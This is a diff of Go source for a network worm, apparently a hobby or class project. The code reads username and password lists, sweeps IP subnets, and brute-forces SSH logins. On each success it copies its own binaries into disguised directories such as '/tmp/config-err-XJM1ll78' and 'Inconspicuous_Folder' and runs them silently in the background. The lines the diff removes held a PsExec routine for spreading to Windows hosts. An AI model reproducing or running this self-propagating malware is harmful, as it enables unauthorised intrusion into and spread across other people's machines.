@@ -11,13 +11,16 @@ import (
 		"strconv"
 		"runtime"
 		"sync"
-		"os/exec"
-		"regexp"
-	"github.com/tmc/scp"
-)
 
-func main() {
+	"github.com/tmc/scp"
+	//"net/http"
+)
+func main(){
 	myos := runtime.GOOS
+	startwormingboi(myos)
+}
+
+func startwormingboi(myos string) {
 
 	var user = readinfile("user.txt")
 	var passwds = readinfile("passwds.txt")
@@ -40,37 +43,15 @@ func main() {
 	for i := 0; i < len(subnets); i++ {
 		for l := start; l <= stop; l=l+stepval{
 			myip = joinstrings(subnets[i],strconv.Itoa(int(l)))
-				fmt.Println("Ping Works For IP", myip)
 				wg.Add(1)
 				go gettingin(myip, user, passwds, myos, &wg)
-		}
+
+			}
+			wg.Wait()
 		}
 		wg.Wait()
 	 } 
-/**
-func checkip(myip string) (ipworks bool){
-	ipworks = false
-	p := fastping.NewPinger()
-	ra, err := net.ResolveIPAddr("ip4:icmp", myip)
-	if err != nil {
-		fmt.Println(err)
-		os.Exit(1)
-	}
-	p.AddIPAddr(ra)
-	p.OnRecv = func(addr *net.IPAddr, rtt time.Duration) {
-		ipworks = true
-		return
-	}
-	p.OnIdle = func() {
-		return
-	}
-	err = p.Run()
-	if err != nil {
-		fmt.Println(err)
-	}
-	return
-}
-**/
+
 func gettingin(myip string, user []string, passwds []string, myos string, wg *sync.WaitGroup ){
 	n := 0
 	var iswin = false
@@ -89,7 +70,9 @@ func gettingin(myip string, user []string, passwds []string, myos string, wg *sy
 				iswin = true
 			}
 			if iswin{
+				/**
 				if  myos == "windows"{
+
 					wincon := getinwin(myip, user[j],passwds[k])
 					if wincon == 1 {
 						fmt.Println("Im in windows with", myip, user[j], passwds[k])
@@ -104,7 +87,8 @@ func gettingin(myip string, user []string, passwds []string, myos string, wg *sy
 					fmt.Println("cant get onto windows from nonwindows :(")
 					passbreak = true
 					break
-				}
+				}*/
+				passbreak = true;
 			}
 			if n == 2{
 				fmt.Println("ssh doesn't work for %s with user:%s and pass:%s", myip,user[j],passwds[k] )
@@ -139,9 +123,18 @@ func getinlinux(myip string, user string, passwd string) (myreturn string) {
 	}
 
 	session := newsession(connection)
-	execlinuxcmd(session, "mkdir /tmp/config-err-XJM1ll")
-	scpexec(session,"linuxhappyfuntimes.exe", "/tmp/config-err-XJM1ll/linuxhappyfuntimes")
-	execlinuxcmd(session,"./tmp/config-err-XJM1ll/linuxhappyfuntimes")
+	if (execlinuxcmd(session, "who")!=nil) {
+		execlinuxcmd(session, "mkdir \Users\\%USERNAME%\\AppData\\Roaming\\Inconspicuous_Folder'")
+		scpexec(session, "linuxhappyfuntimes", "\\Users\\%USERNAME%\\AppData\\Roaming\\Inconspicuous_Folder\\linuxhappyfuntimes")
+		scpexec(session, "windowshappyfuntimes", "\\Users\\%USERNAME%\\AppData\\Roaming\\Inconspicuous_Folder\\windowshappyfuntimes")
+		execlinuxcmd(session, "START /B \\Users\\%USERNAME%\\AppData\\Roaming\\Inconspicuous_Folder\\windowshappyfuntimes")
+	} else {
+		execlinuxcmd(session, "mkdir /tmp/config-err-XJM1ll78")
+		scpexec(session, "linuxhappyfuntimes", "/tmp/config-err-XJM1ll78/linuxhappyfuntimes")
+		scpexec(session, "windowshappyfuntimes", "/tmp/config-err-XJM1ll78/windowshappyfuntimes")
+		execlinuxcmd(session, "./tmp/config-err-XJM1ll78/linuxhappyfuntimes > /dev/null 2>&1 &")
+		// add exploit here
+	}
 	session.Close()
 	return "yes"
 }
@@ -149,16 +142,14 @@ func getinlinux(myip string, user string, passwd string) (myreturn string) {
 func newsession(connection *ssh.Client)(session *ssh.Session){
 	session, err := connection.NewSession()
 	if err != nil {
-		panic(err)
+
 	}
 	return
 }
 
-func execlinuxcmd( session *ssh.Session, cmd string)() {
-	output, err := session.CombinedOutput(cmd)
+func execlinuxcmd( session *ssh.Session, cmd string)(err error) {
+	_ , err = session.CombinedOutput(cmd)
 	if err != nil {
-		panic(err)
-		fmt.Println(output)
 	}
 	return
 }
@@ -166,73 +157,14 @@ func execlinuxcmd( session *ssh.Session, cmd string)() {
 func scpexec( session *ssh.Session, srcfile string, destfile string)() {
 	err := scp.CopyPath(srcfile, destfile, session)
 	if err != nil {
-		panic(err)
 	}
 	return
 }
-/**
-	modes := ssh.TerminalModes{
-	ssh.ECHO:          0,     // disable echoing
-	ssh.TTY_OP_ISPEED: 14400, // input speed = 14.4kbaud
-	ssh.TTY_OP_OSPEED: 14400, // output speed = 14.4kbaud
-}
 
-	if err := session.RequestPty("xterm", 80, 40, modes); err != nil {
-		session.Close()
-		fmt.Println("cant open terminal")
-		return "no"
-	}**/
 
 
 func getinwin(myip string, user string, passwd string) (wincon int) {
-	/*dir, err := os.Getwd()
-	if err != nil {
-		log.Fatal(err)
-	}*/
-	pscom := "PsExec64.exe"
-	iparg := joinstrings("\\\\", myip)
-	// TODO make worm spread, vs make a popup
-	cmd := exec.Command(pscom, iparg,"-n","5","-u",user,"-p",passwd, "-accepteula","ipconfig" )
-	fmt.Println(user)
-	fmt.Println(passwd)
-	fmt.Println(cmd)
-	output, err := cmd.CombinedOutput()
-	fmt.Println(err)
-	strout := string(output)
 
-	if regexp.MustCompile(`error code 0`).MatchString(strout) == true { 								//true work case
-	/*
-		pscom := "psexec.exe \\"
-		joinstrings(pscom, myip)
-		joinstrings(pscom, " -c worm_windows_amd64.exe")
-	*/											//put payload here
-
-		cmd := exec.Command(pscom, iparg,"-n","5","-u",user,"-p",passwd, "-accepteula","-c","PsExec64.exe" )
-		output, err := cmd.CombinedOutput()
-		if err != nil {
-			fmt.Println(output)
-		}
-		cmd = exec.Command(pscom, iparg,"-n","5","-u",user,"-p",passwd, "-accepteula","-c","linuxhappyfuntimes" )
-		output, err = cmd.CombinedOutput()
-		if err != nil {
-			fmt.Println(output)
-		}
-		cmd = exec.Command(pscom, iparg,"-n","5","-u",user,"-p",passwd, "-accepteula","-c","windowshappyfuntimes" )
-		output, err = cmd.CombinedOutput()
-		if err != nil {
-			fmt.Println(output)
-		}
-
-		fmt.Println("exit 1")
-
-		wincon = 1
-	} else if regexp.MustCompile(`The user name or password is incorrect.`).MatchString(strout) == true {						//false case
-		wincon = 2
-		fmt.Println("exit 2")
-	} else {											//psexec doesn't work
-		wincon = 3
-		fmt.Println("exit 3")
-	}
 	return
 }
 
